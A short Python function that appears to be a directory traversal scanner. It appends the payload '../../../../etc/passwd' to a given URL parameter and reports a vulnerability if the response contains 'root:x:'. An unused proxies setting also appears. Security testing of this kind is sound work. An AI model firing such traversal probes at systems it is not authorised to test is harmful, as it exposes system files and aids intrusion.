import requests

def test_directory_traversal(url, param):
    payload = "../../../../etc/passwd"
    full_url = f"{url}?{param}={payload}"

    proxies = {
        "http": None,
        "https": None,
    }
    response = requests.get(full_url)
    if "root:x:" in response.text:
        return f"Directory Traversal Vulnerability Found at {full_url}"
    return f"No Directory Traversal Vulnerability Found at {full_url}"
